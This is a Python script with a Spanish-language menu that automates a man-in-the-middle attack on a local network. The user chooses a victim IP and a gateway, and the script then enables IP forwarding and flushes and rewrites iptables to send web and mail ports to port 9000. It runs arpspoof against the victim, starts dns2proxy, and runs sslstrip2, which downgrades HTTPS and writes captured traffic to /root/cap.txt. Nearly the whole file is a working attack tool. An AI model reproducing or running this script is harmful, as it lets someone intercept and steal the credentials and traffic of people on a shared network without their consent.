import os
import time
import sys
import threading

from subprocess import Popen, PIPE, STDOUT

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ variables $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


listamenu=["Menu de Opciones:", "1--Selec Interfaz ", "2--Selec Ip-victima ","3--ataque", "4--Exit" ]#Menu Princcipal
exit=False
key=0
key1=""

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU PRINCIPAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


def menu():

	print("\033[1;31;1m ")
	os.system('figlet    mImTrAnGe2020')
	print("\033[1;37;1m ")
	print("            "+listamenu[0])
	print("\033[1;37;m ")
	print("            "+listamenu[1])
	print("            "+listamenu[2])
	print("            "+listamenu[3])
	print("            "+listamenu[4])

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ menu seleccion interfaz $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


def selec_wlan():
	global wlan
	while True:
		try:
			wlan=(input("Introduzca interfaz telnet: "))
			print("interfaz seleccionada "+ wlan)
			return wlan
			break

		except TypeError:
			print("error selec interfaz")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$	

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ funciones menu $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$	

def menuconfip():
	global ip_intrusa
	global ip_gateway
	key1=(str(input("visualizar ip de la red y o n: ")))

	if(key1=='y'):

		os.system('netdiscover')

		print("configuracion de iPs ")
		ip_intrusa=input("introduzca ip victima: ")
		ip_gateway=input("introduzca ip ip_gateway: ")
		print("Datos de configuracion listos ")
		print(ip_intrusa, ip_gateway)

	else:
		print("configuracion de iPs ")
		ip_intrusa=input("introduzca ip victima: ")
		ip_gateway=input("introduzca ip ip_gateway: ")
		print("Datos de configuracion listos ")
		print(ip_intrusa, ip_gateway)

	return ip_intrusa, ip_gateway

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ funciones de servicios en ejecucion $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

def iptable():
	
	print("configurando iptables 0%") 

	os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')
	os.system('iptables -F')
	os.system('iptables -X')
	os.system('iptables -Z')
	os.system('iptables -t nat -F')	
	os.system('iptables -P FORWARD ACCEPT')
	os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 9000')
	os.system('iptables -t nat -A PREROUTING -p tcp --dport 8080 -j REDIRECT --to-port 9000')	
	os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 9000')
	os.system('iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-port 9000')
	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53')
	os.system('iptables-save > /etc/iptables.up.rules')

	print("configuracion iptables terminada 100%")
	
def arp():													
	arp=threading.Thread(target=arpoof, args=(ip_intrusa, ip_gateway, wlan,))
	arp.start()

def arpoof(ip_intrusa, ip_gateway, wlan, **datos):
	while True:
		try:
			print("Activacion ARPpoof 0%")
			process_arpoof=Popen(['x-terminal-emulator', '-e', 'arpspoof', '-i', wlan, '-t', ip_intrusa, ip_gateway], stdout=PIPE, stderr=PIPE)
			stdout, stderr=process_arpoof.communicate()	
			print("Activacion ARPpoof 100%")
			
			break
		except TypeError:
			MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")

def dns():													
	DnS=threading.Thread(target=DNS, args=())
	DnS.start()

def DNS( **datos):
	while True:
		try:
			print("Activacion servidorDNS 0%")
			process_DNS = Popen(['x-terminal-emulator', '-e', 'python', 'dns2proxy.py'], stdout=PIPE, stderr=PIPE)	
			stdout, stderr = process_DNS.communicate()
			print("Activacion servidorDNS 100%")
			break
		except TypeError:
			MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")

def sslstrip():
	while True:
		try:
			print("Activacion sslstrip2 0%")
			os.system('python sslstrip2/sslstrip.py -l 9000 -a -w /root/cap.txt')
			print("Activacion sslstrip2 100%")
			break
		except TypeError:
			MessageBox.showerror("Error", "Ha ocurrido un error inesperado.")
	
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$4 loop program $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

while exit==False:


	menu()
	key=(int(input("            "+"Select: ")))
	
	if (key==1):

		selec_wlan()
		print("interfaz seleccionada "+ wlan)

	elif (key==2):

		menuconfip()			
		print(ip_intrusa) 
		print(ip_gateway)
	
	elif (key==3):

		iptable()
		arp()
		dns()
		sslstrip()

	elif (key==4):

		exit=True
	
print("\033[1;31;1m ")	
print("Smp_A byTe_Dey_bYte_HackiNg")
print("\033[1;31;m ")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
